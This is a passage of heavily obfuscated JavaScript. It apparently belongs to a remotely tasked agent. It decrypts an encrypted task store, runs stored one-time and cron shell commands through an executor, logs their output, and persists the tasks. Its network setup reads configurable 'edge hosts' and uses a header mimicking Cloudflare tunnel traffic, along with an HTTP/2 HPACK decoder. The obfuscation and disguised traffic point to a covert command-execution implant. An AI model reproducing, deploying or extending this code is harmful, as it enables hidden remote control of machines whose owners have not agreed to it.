            if (!a0l[cF(0x871)](b[cF(0x7eb)]))
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            const c = a0l[cF(0x3f2)](b[cF(0x7eb)], cF(0x610))[cF(0x7b0)]();
            if (!c)
                return {
                    'onetasks': [],
                    'crontasks': {}
                };
            let d;
            try {
                d = JSON[cF(0x57a)](a0Z[cF(0x6db)](b['key'], c));
            } catch (j) {
                throw new Error(cF(0x869) + j[cF(0x842)]);
            }
            if (!d || a[cF(0x5be)](d['magic'], a0Z[cF(0x6d9)]))
                throw new Error(a[cF(0x6c3)]);
            const f = a[cF(0x81a)](parseInt, d['version'], 0xa) || 0x0;
            if (a[cF(0x6ba)](f, a0Z[cF(0x84d)]))
                return b[cF(0x23e)] = !![], a0D[cF(0x993)]('[TaskStore]\x20❌\x20存储版本\x20' + f + cF(0x758) + a0Z[cF(0x84d)] + cF(0x6f4)), {
                    'onetasks': [],
                    'crontasks': {}
                };
            if (a['zUayk'](f, a0Z[cF(0x84d)]))
                throw new Error(cF(0x61a) + f);
            const g = d[cF(0x37d)] || {};
            b['lastSavedAt'] = d[cF(0x2f9)] || null;
            const h = Array[cF(0x2ad)](g[cF(0x76d)]) ? g[cF(0x76d)][cF(0x499)](String) : [], i = {};
            for (const [l, m] of Object[cF(0x271)](g[cF(0x8c8)] || {}))
                i[String(l)] = String(m);
            return a0D[cF(0x8e1)](cF(0x269) + h['length'] + cF(0x784) + Object['keys'](i)[cF(0x7f5)]), {
                'onetasks': h,
                'crontasks': i
            };
        } catch (n) {
            return a0Z['quarantine'](cF(0x303) + n[cF(0x842)]), {
                'onetasks': [],
                'crontasks': {}
            };
        }
    }
    static [a0aY(0x563)](a) {
        const cG = a0aY;
        try {
            const b = a0Z['state'];
            if (b[cG(0x7eb)] && a0l[cG(0x871)](b[cG(0x7eb)])) {
                const c = b[cG(0x7eb)] + cG(0x4a3) + Date[cG(0x2a9)]();
                a0l[cG(0x2cf)](b['path'], c), a0D['error'](cG(0x29f) + a + cG(0x6a9) + c);
            } else
                a0D[cG(0x993)](cG(0x29f) + a);
        } catch (d) {
            a0D['error'](cG(0x29f) + a + cG(0x725) + d[cG(0x842)]);
        }
    }
    static [a0aY(0x3b0)](a, b) {
        const cH = a0aY, c = { 'cxtkr': cH(0x610) }, d = a0Z[cH(0x582)];
        if (!d[cH(0x43c)] || d[cH(0x23e)])
            return ![];
        let f = null;
        try {
            const g = {
                    'magic': a0Z['MAGIC'],
                    'version': a0Z[cH(0x84d)],
                    'saved_at': new Date()[cH(0x613)]()['replace'](/\.\d+Z$/, 'Z'),
                    'data': {
                        'onetasks': a || [],
                        'crontasks': b || {}
                    }
                }, h = a0Z[cH(0x430)](d[cH(0x810)], JSON['stringify'](g));
            return a0l[cH(0x38b)](a0o[cH(0x312)](d[cH(0x7eb)]), { 'recursive': !![] }), f = d['path'] + '.tmp-' + process['pid'], a0l[cH(0x540)](f, h, c[cH(0x770)]), a0l[cH(0x2cf)](f, d[cH(0x7eb)]), d[cH(0x25d)] = g[cH(0x2f9)], !![];
        } catch (i) {
            a0D[cH(0x993)](cH(0x5e6) + i[cH(0x842)]);
            try {
                if (f && a0l[cH(0x871)](f))
                    a0l[cH(0x238)](f);
            } catch (j) {
            }
            return ![];
        }
    }
}
class a0a0 {
    static [a0aY(0x6d0)] = new Map();
    static ['_appendLog'](a, b) {
        const cI = a0aY, c = {
                'TzxUI': function (d, f) {
                    return d > f;
                },
                'yGaul': function (d, f) {
                    return d - f;
                }
            };
        a[cI(0x39c)](b), c[cI(0x64b)](a[cI(0x7f5)], a0P[cI(0x899)]) && a[cI(0x953)](0x0, c['yGaul'](a['length'], a0P[cI(0x899)]));
    }
    static ['_formatLogEntry'](a, b, c, d, f = null) {
        const cJ = a0aY, g = new Date()[cJ(0x613)]();
        return {
            'ts': g,
            'cmd': a,
            'output': b,
            'exitcode': c,
            'type': d,
            'cron': f,
            'formatted': g + '\x20----\x20' + a + cJ(0x4e4) + c + '\x0a' + (b?.[cJ(0x7b0)]() || '')
        };
    }
    static [a0aY(0x92b)]() {
        const cK = a0aY;
        return {
            'status': 'ok',
            'count': a0P[cK(0x76d)]['length'],
            'tasks': a0P[cK(0x76d)]
        };
    }
    static async ['setOnetimeTasks'](a) {
        const cL = a0aY, b = {
                'LqUti': function (d, f) {
                    return d > f;
                },
                'IGAod': function (d, f) {
                    return d < f;
                },
                'dnWSU': cL(0x55f),
                'bpEvw': function (d, f) {
                    return d === f;
                },
                'JNSvE': cL(0x993)
            };
        a0P[cL(0x76d)] = a || [];
        const c = [];
        if (a0P[cL(0x911)] && b[cL(0x802)](a0P[cL(0x76d)][cL(0x7f5)], 0x0)) {
            for (let d = 0x0; b[cL(0x3a0)](d, a0P[cL(0x76d)][cL(0x7f5)]); d++) {
                const f = a0P[cL(0x76d)][d], g = await a0V[cL(0x35a)](f), h = this[cL(0x1e8)](f, g[cL(0x296)], g[cL(0x49b)], b['dnWSU']);
                this[cL(0x53d)](a0P['onetimetasks_log'], h), c[cL(0x39c)]({
                    'index': d,
                    'cmd': f,
                    'exitcode': g[cL(0x49b)],
                    'output': g['result'],
                    'status': b[cL(0x609)](g[cL(0x49b)], 0x0) ? 'ok' : b[cL(0x795)]
                });
            }
            a0P[cL(0x911)] = ![];
        }
        return {
            'status': 'ok',
            'count': a0P[cL(0x76d)]['length'],
            'tasks': a0P['onetasks'],
            'executed': c,
            'persisted': a0Z[cL(0x3b0)](a0P[cL(0x76d)], a0P[cL(0x8c8)])
        };
    }
    static [a0aY(0x5ec)]() {
        const cM = a0aY;
        return {
            'status': 'ok',
            'count': Object[cM(0x8c1)](a0P[cM(0x8c8)])[cM(0x7f5)],
            'tasks': a0P[cM(0x8c8)]
        };
    }
    static [a0aY(0x941)](a) {
        const cN = a0aY, b = {
                'vIZwd': function (d, f) {
                    return d === f;
                },
                'qUIZI': 'function',
                'QScyQ': function (d, f) {
                    return d === f;
                },
                'ZCarU': 'error',
                'lzitB': function (d, f) {
                    return d - f;
                }
            };
        this['cronJobs'][cN(0x4e1)](d => {
            const cO = cN;
            b[cO(0x7c5)](typeof d[cO(0x28a)], b[cO(0x4e8)]) && d[cO(0x28a)](), b[cO(0x55a)](typeof d[cO(0x7f0)], cO(0x71f)) && d[cO(0x7f0)]();
        }), this[cN(0x6d0)][cN(0x778)]();
        const c = [];
        for (const d of Object[cN(0x8c1)](a || {})) {
            !a0t[cN(0x527)](d) && c[cN(0x39c)](d);
        }
        if (c[cN(0x7f5)] > 0x0)
            return {
                'status': b['ZCarU'],
                'message': cN(0x575) + c[cN(0x265)](',\x20'),
                'valid_count': b[cN(0x274)](Object['keys'](a || {})[cN(0x7f5)], c['length'])
            };
        a0P['crontasks'] = a || {};
        for (const [f, g] of Object[cN(0x271)](a0P[cN(0x8c8)])) {
            const h = a0t[cN(0x5f4)](f, async () => {
                const cP = cN, i = await a0V[cP(0x35a)](g), j = this[cP(0x1e8)](g, i[cP(0x296)], i['exitcode'], cP(0x756), f);
                this['_appendLog'](a0P[cP(0x919)], j);
            });
            this[cN(0x6d0)][cN(0x336)](f, h);
        }
        return a0P[cN(0x98e)] = Object[cN(0x8c1)](a0P[cN(0x8c8)])[cN(0x7f5)] > 0x0, {
            'status': 'ok',
            'count': Object[cN(0x8c1)](a0P[cN(0x8c8)])[cN(0x7f5)],
            'tasks': a0P[cN(0x8c8)],
            'persisted': a0Z['save'](a0P[cN(0x76d)], a0P[cN(0x8c8)])
        };
    }
    static [a0aY(0x317)]() {
        const cQ = a0aY;
        return {
            'onetime': {
                'pending': a0P['InitTask'],
                'count': a0P['onetasks']['length']
            },
            'cron': {
                'active': a0P['cronloop'],
                'count': Object[cQ(0x8c1)](a0P[cQ(0x8c8)])[cQ(0x7f5)],
                'check_interval': a0P[cQ(0x7ef)]
            },
            'persistence': {
                'enabled': a0Z['state'][cQ(0x43c)],
                'store_path': a0Z['state']['path'],
                'last_saved_at': a0Z[cQ(0x582)][cQ(0x25d)]
            }
        };
    }
    static ['getOnetimeLogs'](a = 0x32) {
        const cR = a0aY, b = a0P[cR(0x72b)]['slice'](-a);
        return {
            'status': 'ok',
            'count': b[cR(0x7f5)],
            'logs': b
        };
    }
    static [a0aY(0x77c)](a = 0x32) {
        const cS = a0aY, b = a0P[cS(0x919)][cS(0x710)](-a);
        return {
            'status': 'ok',
            'count': b[cS(0x7f5)],
            'logs': b
        };
    }
    static ['clearOnetimeLogs']() {
        const cT = a0aY, a = { 'wkhMN': cT(0x55f) }, b = a0P[cT(0x72b)][cT(0x7f5)];
        return a0P[cT(0x72b)] = [], {
            'status': 'ok',
            'cleared': a[cT(0x85b)]
        };
    }
    static [a0aY(0x8fe)]() {
        const cU = a0aY, a = { 'XmoiS': cU(0x756) }, b = a0P[cU(0x919)][cU(0x7f5)];
        return a0P[cU(0x919)] = [], {
            'status': 'ok',
            'cleared': a[cU(0x929)]
        };
    }
    static [a0aY(0x496)]() {
        const cV = a0aY, a = {
                'gDMTa': function (g, h) {
                    return g - h;
                }
            }, b = a0P['onetimetasks_log'][cV(0x4b3)](g => g[cV(0x49b)] === 0x0)[cV(0x7f5)], c = a0P[cV(0x72b)][cV(0x7f5)] - b, d = a0P['crontasks_log']['filter'](g => g['exitcode'] === 0x0)[cV(0x7f5)], f = a['gDMTa'](a0P[cV(0x919)]['length'], d);
        return {
            'onetime': {
                'total_logged': a0P[cV(0x72b)][cV(0x7f5)],
                'max_capacity': a0P[cV(0x899)],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0P[cV(0x919)][cV(0x7f5)],
                'max_capacity': a0P[cV(0x899)],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async [a0aY(0x2a2)]() {
        const cW = a0aY, a = { 'bfabM': 'onetime' }, b = [];
        for (let c = 0x0; c < a0P[cW(0x76d)]['length']; c++) {
            const d = a0P[cW(0x76d)][c], f = await a0V[cW(0x35a)](d), g = this[cW(0x1e8)](d, f['result'], f[cW(0x49b)], a[cW(0x785)]);
            this[cW(0x53d)](a0P[cW(0x72b)], g), b['push']({
                'cmd': d,
                'exitcode': f[cW(0x49b)],
                'output': f[cW(0x296)],
                'timeout': f[cW(0x642)]
            });
        }
        return a0P[cW(0x911)] = ![], {
            'status': 'ok',
            'executed': b[cW(0x7f5)],
            'results': b
        };
    }
    static [a0aY(0x6bd)]() {
        const cX = a0aY, a = {
                'CfDGl': function (c, d) {
                    return c > d;
                },
                'gmRIa': function (c, d) {
                    return c > d;
                }
            };
        a0Z['init']();
        const b = a0Z[cX(0x663)]();
        a[cX(0x6c1)](b[cX(0x76d)][cX(0x7f5)], 0x0) && (a0P['onetasks'] = b[cX(0x76d)]);
        if (a[cX(0x6c1)](Object[cX(0x8c1)](b[cX(0x8c8)])['length'], 0x0))
            try {
                a0a0['setCronTasks'](b[cX(0x8c8)]);
            } catch (c) {
                a0D['error'](cX(0x2ea) + c[cX(0x842)]);
            }
        a['gmRIa'](a0P[cX(0x76d)]['length'], 0x0) && a0P[cX(0x911)] && a0a0[cX(0x2a2)]()[cX(0x7a8)](d => a0D['error'](cX(0x2bc) + d[cX(0x842)]));
    }
}
function a0b(a, b) {
    a = a - 0x1e2;
    const c = a0a();
    let d = c[a];
    if (a0b['iOPNcI'] === undefined) {
        var e = function (h) {
            const i = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
            let j = '', l = '';
            for (let m = 0x0, n, o, p = 0x0; o = h['charAt'](p++); ~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? j += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) {
                o = i['indexOf'](o);
            }
            for (let q = 0x0, r = j['length']; q < r; q++) {
                l += '%' + ('00' + j['charCodeAt'](q)['toString'](0x10))['slice'](-0x2);
            }
            return decodeURIComponent(l);
        };
        a0b['schCul'] = e, a0b['HArTHg'] = {}, a0b['iOPNcI'] = !![];
    }
    const f = c[0x0];
    a0b['klnMvv'] !== f && (a0b['HArTHg'] = {}, a0b['klnMvv'] = f);
    const g = a0b['HArTHg'][a];
    return g === undefined ? (d = a0b['schCul'](d), a0b['HArTHg'][a] = d) : d = g, d;
}
const a0a1 = a0aY(0x84b), a0a2 = ((() => {
        const cY = a0aY, a = {
                'IkfGR': function (c, d) {
                    return c(d);
                },
                'KztkY': function (c, d) {
                    return c > d;
                },
                'CvYLr': cY(0x8dd),
                'TsvSF': cY(0x277)
            }, b = a['IkfGR'](String, process.env.KISAMA_EDGE_HOSTS || '')[cY(0x946)](',')[cY(0x499)](c => c[cY(0x7b0)]())[cY(0x4b3)](Boolean);
        return a[cY(0x938)](b[cY(0x7f5)], 0x0) ? b : [
            a[cY(0x240)],
            a['TsvSF']
        ];
    })()), a0a3 = 0x1ea4, a0a4 = 'cf-cloudflared-proxy-connection-upgrade', a0a5 = a0aY(0x7bf), a0a6 = 0x4000, a0a7 = [
        [
            a0aY(0x632),
            ''
        ],
        [
            a0aY(0x3f1),
            'GET'
        ],
        [
            ':method',
            a0aY(0x920)
        ],
        [
            ':path',
            '/'
        ],
        [
            a0aY(0x209),
            '/index.html'
        ],
        [
            a0aY(0x830),
            'http'
        ],
        [
            a0aY(0x830),
            a0aY(0x6c7)
        ],
        [
            a0aY(0x736),
            a0aY(0x673)
        ],
        [
            a0aY(0x736),
            a0aY(0x8d6)
        ],
        [
            ':status',
            '206'
        ],
        [
            a0aY(0x736),
            '304'
        ],
        [
            a0aY(0x736),
            a0aY(0x7ac)
        ],
        [
            ':status',
            '404'
        ],
        [
            ':status',
            '500'
        ],
        [
            a0aY(0x967),
            ''
        ],
        [
            a0aY(0x83e),
            'gzip,\x20deflate'
        ],
        [
            a0aY(0x67c),
            ''
        ],
        [
            'accept-ranges',
            ''
        ],
        [
            'accept',
            ''
        ],
        [
            'access-control-allow-origin',
            ''
        ],
        [
            a0aY(0x580),
            ''
        ],
        [
            a0aY(0x4b8),
            ''
        ],
        [
            a0aY(0x5bc),
            ''
        ],
        [
            a0aY(0x3d1),
            ''
        ],
        [
            'content-disposition',
            ''
        ],
        [
            'content-encoding',
            ''
        ],
        [
            a0aY(0x964),
            ''
        ],
        [
            a0aY(0x3ba),
            ''
        ],
        [
            'content-location',
            ''
        ],
        [
            a0aY(0x492),
            ''
        ],
        [
            'content-type',
            ''
        ],
        [
            a0aY(0x339),
            ''
        ],
        [
            a0aY(0x4a7),
            ''
        ],
        [
            a0aY(0x40f),
            ''
        ],
        [
            a0aY(0x432),
            ''
        ],
        [
            a0aY(0x865),
            ''
        ],
        [
            a0aY(0x4ed),
            ''
        ],
        [
            a0aY(0x324),
            ''
        ],
        [
            'if-match',
            ''
        ],
        [
            a0aY(0x2e2),
            ''
        ],
        [
            a0aY(0x25c),
            ''
        ],
        [
            'if-range',
            ''
        ],
        [
            a0aY(0x2f6),
            ''
        ],
        [
            a0aY(0x2d4),
            ''
        ],
        [
            a0aY(0x3f8),
            ''
        ],
        [
            a0aY(0x908),
            ''
        ],
        [
            a0aY(0x1ef),
            ''
        ],
        [
            a0aY(0x43d),
            ''
        ],
        [
            a0aY(0x586),
            ''
        ],
        [
            a0aY(0x654),
            ''
        ],
        [
            a0aY(0x403),
            ''
        ],
        [
            'refresh',
            ''
        ],
        [
            a0aY(0x3c4),
            ''
        ],
        [
            a0aY(0x98c),
            ''
        ],
        [
            a0aY(0x59b),
            ''
        ],
        [
            'strict-transport-security',
            ''
        ],
        [
            a0aY(0x653),
            ''
        ],
        [
            a0aY(0x345),
            ''
        ],
        [
            'vary',
            ''
        ],
        [
            'via',
            ''
        ],
        [
            a0aY(0x298),
            ''
        ]
    ], a0a8 = [
        0x1ff8,
        0x7fffd8,
        0xfffffe2,
        0xfffffe3,
        0xfffffe4,
        0xfffffe5,
        0xfffffe6,
        0xfffffe7,
        0xfffffe8,
        0xffffea,
        0x3ffffffc,
        0xfffffe9,
        0xfffffea,
        0x3ffffffd,
        0xfffffeb,
        0xfffffec,
        0xfffffed,
        0xfffffee,
        0xfffffef,
        0xffffff0,
        0xffffff1,
        0xffffff2,
        0x3ffffffe,
        0xffffff3,
        0xffffff4,
        0xffffff5,
        0xffffff6,
        0xffffff7,
        0xffffff8,
        0xffffff9,
        0xffffffa,
        0xffffffb,
        0x14,
        0x3f8,
        0x3f9,
        0xffa,
        0x1ff9,
        0x15,
        0xf8,
        0x7fa,
        0x3fa,
        0x3fb,
        0xf9,
        0x7fb,
        0xfa,
        0x16,
        0x17,
        0x18,
        0x0,
        0x1,
        0x2,
        0x19,
        0x1a,
        0x1b,
        0x1c,
        0x1d,
        0x1e,
        0x1f,
        0x5c,
        0xfb,
        0x7ffc,
        0x20,
        0xffb,
        0x3fc,
        0x1ffa,
        0x21,
        0x5d,
        0x5e,
        0x5f,
        0x60,
        0x61,
        0x62,
        0x63,
        0x64,
        0x65,
        0x66,
        0x67,
        0x68,
        0x69,
        0x6a,
        0x6b,
        0x6c,
        0x6d,
        0x6e,
        0x6f,
        0x70,
        0x71,
        0x72,
        0xfc,
        0x73,
        0xfd,
        0x1ffb,
        0x7fff0,
        0x1ffc,
        0x3ffc,
        0x22,
        0x7ffd,
        0x3,
        0x23,
        0x4,
        0x24,
        0x5,
        0x25,
        0x26,
        0x27,
        0x6,
        0x74,
        0x75,
        0x28,
        0x29,
        0x2a,
        0x7,
        0x2b,
        0x76,
        0x2c,
        0x8,
        0x9,
        0x2d,
        0x77,
        0x78,
        0x79,
        0x7a,
        0x7b,
        0x7ffe,
        0x7fc,
        0x3ffd,
        0x1ffd,
        0xffffffc,
        0xfffe6,
        0x3fffd2,
        0xfffe7,
        0xfffe8,
        0x3fffd3,
        0x3fffd4,
        0x3fffd5,
        0x7fffd9,
        0x3fffd6,
        0x7fffda,
        0x7fffdb,
        0x7fffdc,
        0x7fffdd,
        0x7fffde,
        0xffffeb,
        0x7fffdf,
        0xffffec,
        0xffffed,
        0x3fffd7,
        0x7fffe0,
        0xffffee,
        0x7fffe1,
        0x7fffe2,
        0x7fffe3,
        0x7fffe4,
        0x1fffdc,
        0x3fffd8,
        0x7fffe5,
        0x3fffd9,
        0x7fffe6,
        0x7fffe7,
        0xffffef,
        0x3fffda,
        0x1fffdd,
        0xfffe9,
        0x3fffdb,
        0x3fffdc,
        0x7fffe8,
        0x7fffe9,
        0x1fffde,
        0x7fffea,
        0x3fffdd,
        0x3fffde,
        0xfffff0,
        0x1fffdf,
        0x3fffdf,
        0x7fffeb,
        0x7fffec,
        0x1fffe0,
        0x1fffe1,
        0x3fffe0,
        0x1fffe2,
        0x7fffed,
        0x3fffe1,
        0x7fffee,
        0x7fffef,
        0xfffea,
        0x3fffe2,
        0x3fffe3,
        0x3fffe4,
        0x7ffff0,
        0x3fffe5,
        0x3fffe6,
        0x7ffff1,
        0x3ffffe0,
        0x3ffffe1,
        0xfffeb,
        0x7fff1,
        0x3fffe7,
        0x7ffff2,
        0x3fffe8,
        0x1ffffec,
        0x3ffffe2,
        0x3ffffe3,
        0x3ffffe4,
        0x7ffffde,
        0x7ffffdf,
        0x3ffffe5,
        0xfffff1,
        0x1ffffed,
        0x7fff2,
        0x1fffe3,
        0x3ffffe6,
        0x7ffffe0,
        0x7ffffe1,
        0x3ffffe7,
        0x7ffffe2,
        0xfffff2,
        0x1fffe4,
        0x1fffe5,
        0x3ffffe8,
        0x3ffffe9,
        0xffffffd,
        0x7ffffe3,
        0x7ffffe4,
        0x7ffffe5,
        0xfffec,
        0xfffff3,
        0xfffed,
        0x1fffe6,
        0x3fffe9,
        0x1fffe7,
        0x1fffe8,
        0x7ffff3,
        0x3fffea,
        0x3fffeb,
        0x1ffffee,
        0x1ffffef,
        0xfffff4,
        0xfffff5,
        0x3ffffea,
        0x7ffff4,
        0x3ffffeb,
        0x7ffffe6,
        0x3ffffec,
        0x3ffffed,
        0x7ffffe7,
        0x7ffffe8,
        0x7ffffe9,
        0x7ffffea,
        0x7ffffeb,
        0xffffffe,
        0x7ffffec,
        0x7ffffed,
        0x7ffffee,
        0x7ffffef,
        0x7fffff0,
        0x3ffffee,
        0x3fffffff
    ], a0a9 = [
        0xd,
        0x17,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x18,
        0x1e,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x6,
        0xa,
        0xa,
        0xc,
        0xd,
        0x6,
        0x8,
        0xb,
        0xa,
        0xa,
        0x8,
        0xb,
        0x8,
        0x6,
        0x6,
        0x6,
        0x5,
        0x5,
        0x5,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x7,
        0x8,
        0xf,
        0x6,
        0xc,
        0xa,
        0xd,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x8,
        0x7,
        0x8,
        0xd,
        0x13,
        0xd,
        0xe,
        0x6,
        0xf,
        0x5,
        0x6,
        0x5,
        0x6,
        0x5,
        0x6,
        0x6,
        0x6,
        0x5,
        0x7,
        0x7,
        0x6,
        0x6,
        0x6,
        0x5,
        0x6,
        0x7,
        0x6,
        0x5,
        0x5,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0xf,
        0xb,
        0xe,
        0xd,
        0x1c,
        0x14,
        0x16,
        0x14,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x17,
        0x17,
        0x17,
        0x18,
        0x17,
        0x18,
        0x18,
        0x16,
        0x17,
        0x18,
        0x17,
        0x17,
        0x17,
        0x17,
        0x15,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x18,
        0x16,
        0x15,
        0x14,
        0x16,
        0x16,
        0x17,
        0x17,
        0x15,
        0x17,
        0x16,
        0x16,
        0x18,
        0x15,
        0x16,
        0x17,
        0x17,
        0x15,
        0x15,
        0x16,
        0x15,
        0x17,
        0x16,
        0x17,
        0x17,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x16,
        0x17,
        0x1a,
        0x1a,
        0x14,
        0x13,
        0x16,
        0x17,
        0x16,
        0x19,
        0x1a,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x18,
        0x19,
        0x13,
        0x15,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x1b,
        0x18,
        0x15,
        0x15,
        0x1a,
        0x1a,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x14,
        0x18,
        0x14,
        0x15,
        0x16,
        0x15,
        0x15,
        0x17,
        0x16,
        0x16,
        0x19,
        0x19,
        0x18,
        0x18,
        0x1a,
        0x17,
        0x1a,
        0x1b,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1a,
        0x1e
    ];
function a0aa() {
    const cZ = a0aY, a = {
            'ncVLj': function (c, d) {
                return c < d;
            },
            'YmBcD': function (c, d) {
                return c - d;
            },
            'pKcNh': function (c, d) {
                return c & d;
            },
            'rJLBp': function (c, d) {
                return c >> d;
            },
            'TPWoB': function (c, d) {
                return c === d;
            },
            'yfrHO': function (c, d) {
                return c + d;
            }
        }, b = [
            null,
            null,
            -0x1,
            0x0
        ];
    for (let c = 0x0; a['ncVLj'](c, a0a8['length']); c++) {
        const d = a0a8[c], f = a0a9[c];
        let g = b;
        for (let h = a[cZ(0x477)](f, 0x1); h >= 0x0; h--) {
            const i = a[cZ(0x435)](a[cZ(0x98a)](d, h), 0x1);
            a[cZ(0x20e)](g[i], null) && (g[i] = [
                null,
                null,
                -0x1,
                a['yfrHO'](g[0x3], 0x1)
            ]), g = g[i];
        }
        g[0x2] = c;
    }
    return b;
}
const a0ab = a0aa();
function a0ac(a) {
    const d0 = a0aY, b = {
            'biBPs': function (h, i) {
                return h >= i;
            },
            'iMHzY': function (h, i) {
                return h & i;
            },
            'JhYLy': function (h, i) {
                return h >> i;
            },
            'GuPvu': function (h, i) {
                return h | i;
            },
            'zaaKW': function (h, i) {
                return h << i;
            },
            'gQhUj': function (h, i) {
                return h === i;
            },
            'zwZmF': d0(0x2ba),
            'SCRZr': function (h, i) {
                return h >= i;
            },
            'MPdqi': '1|3|4|2|0',
            'xyZBe': function (h, i) {
                return h === i;
            },
            'KLGQW': d0(0x959),
            'uLrgZ': function (h, i) {
                return h > i;
            },
            'tEyDT': function (h, i) {
                return h !== i;
            },
            'wptgz': function (h, i) {
                return h - i;
            },
            'droXn': d0(0x7c7)
        }, c = [];
    let d = a0ab, f = 0x0, g = 0x0;
    for (const h of a) {
        for (let i = 0x7; b['biBPs'](i, 0x0); i--) {
            const j = b[d0(0x6df)](b[d0(0x2c3)](h, i), 0x1);
            f = b[d0(0x2fb)](b['zaaKW'](f, 0x1), j), g += 0x1, d = d[j];
            if (b[d0(0x24a)](d, null))
                throw new Error(b['zwZmF']);
            if (b[d0(0x7f2)](d[0x2], 0x0)) {
                const k = b[d0(0x6e6)][d0(0x946)]('|');
                let l = 0x0;
                while (!![]) {
                    switch (k[l++]) {
                    case '0':
                        g = 0x0;
                        continue;
                    case '1':
                        if (b[d0(0x700)](d[0x2], 0x100))
                            throw new Error(b[d0(0x4a4)]);
                        continue;
                    case '2':
                        f = 0x0;
                        continue;
                    case '3':
                        c[d0(0x39c)](d[0x2]);
                        continue;
                    case '4':
                        d = a0ab;
                        continue;
                    }
                    break;
                }
            }
        }
    }
    if (b[d0(0x46e)](g, 0x7) || b[d0(0x4f8)](f, b['wptgz'](b[d0(0x7b8)](0x1, g), 0x1)))
        throw new Error(b['droXn']);
    return Buffer[d0(0x4ed)](c);
}
function a0ad(a, b, c) {
    const d1 = a0aY, d = {
            'EfAiu': function (j, k) {
                return j >= k;
            },
            'hiftg': d1(0x367),
            'BcOfs': function (j, k) {
                return j - k;
            },
            'hoVHk': function (j, k) {
                return j << k;
            },
            'vvbGO': function (j, k) {
                return j & k;
            },
            'fYSRc': function (j, k) {
                return j < k;
            },
            'HPjhP': function (j, k) {
                return j >= k;
            },
            'eueSe': function (j, k) {
                return j * k;
            },
            'Pydpk': function (j, k) {
                return j & k;
            },
            'yWvVy': function (j, k) {
                return j > k;
            },
            'qiBhF': d1(0x3e0)
        };
    if (d[d1(0x56e)](b, a[d1(0x7f5)]))
        throw new Error(d[d1(0x6d5)]);
    const f = a[b];
    b += 0x1;
    const g = d['BcOfs'](d[d1(0x4d6)](0x1, c), 0x1);
    let h = d[d1(0x2c2)](f, g);
    if (d['fYSRc'](h, g))
        return [
            h,
            b
        ];
    let i = 0x0;
    while (!![]) {
        if (d[d1(0x6e1)](b, a[d1(0x7f5)]))
            throw new Error(d[d1(0x6d5)]);
        const j = a[b];
        b += 0x1, h += d[d1(0x8d3)](d['vvbGO'](j, 0x7f), Math[d1(0x386)](0x2, i));
        if (d[d1(0x76f)](j, 0x80) === 0x0)
            return [
                h,
                b
            ];
        i += 0x7;
        if (d[d1(0x458)](i, 0x1c))
            throw new Error(d[d1(0x884)]);
    }
}
function a0ae(a, b) {
    const d2 = a0aY, c = {
            'hacBg': function (j, k) {
                return j >= k;
            },
            'GOkDu': 'truncated\x20HPACK\x20string',
            'sXMnp': function (j, k) {
                return j(k);
            },
            'umRjR': function (j, k) {
                return j & k;
            },
            'xQEjl': function (j, k, l, m) {
                return j(k, l, m);
            },
            'vkkRp': d2(0x578)
        };
    if (c[d2(0x821)](b, a[d2(0x7f5)]))
        throw new Error(c[d2(0x416)]);
    const d = c['sXMnp'](Boolean, c['umRjR'](a[b], 0x80)), [f, g] = c[d2(0x623)](a0ad, a, b, 0x7), h = g + f;
    if (h > a['length'])
        throw new Error(c[d2(0x6e4)]);
    const i = a[d2(0x23d)](g, h);
    return [
        d ? a0ac(i) : i,
        h
    ];
}
class a0af {
    constructor() {
        this['dynamic'] = [], this['dynamicSize'] = 0x0, this['maxSize'] = 0x1000;
    }
    [a0aY(0x3d0)](a) {
        const d3 = a0aY, b = {
                'gCoxH': d3(0x8fc),
                'XtnQP': function (d, f) {
                    return d <= f;
                },
                'KvBTG': function (d, f) {
                    return d - f;
                },
                'fkdRf': function (d, f) {
                    return d >= f;
                },
                'uAqbv': d3(0x3c0)
            };
        if (a <= 0x0)
            throw new Error(b[d3(0x46b)]);
        if (b[d3(0x716)](a, a0a7[d3(0x7f5)]))
            return a0a7[b[d3(0x3a7)](a, 0x1)];
        const c = b[d3(0x3a7)](b[d3(0x3a7)](a, a0a7[d3(0x7f5)]), 0x1);
        if (c < 0x0 || b[d3(0x325)](c, this[d3(0x3ca)][d3(0x7f5)]))
            throw new Error(b['uAqbv']);
        return this[d3(0x3ca)][c];
    }
    [a0aY(0x23c)](a, b) {
        const d4 = a0aY, c = {
                'zqGTa': function (f, g) {
                    return f + g;
                },
                'HTKOJ': d4(0x610),
                'paXwA': function (f, g) {
                    return f > g;
                },
                'lFclZ': function (f, g) {
                    return f + g;
                }
            }, d = c[d4(0x5cc)](0x20 + Buffer[d4(0x885)](a, c[d4(0x3be)]), Buffer[d4(0x885)](b, c['HTKOJ']));
        if (d > this[d4(0x8ea)]) {
            this[d4(0x3ca)] = [], this[d4(0x577)] = 0x0;
            return;
        }
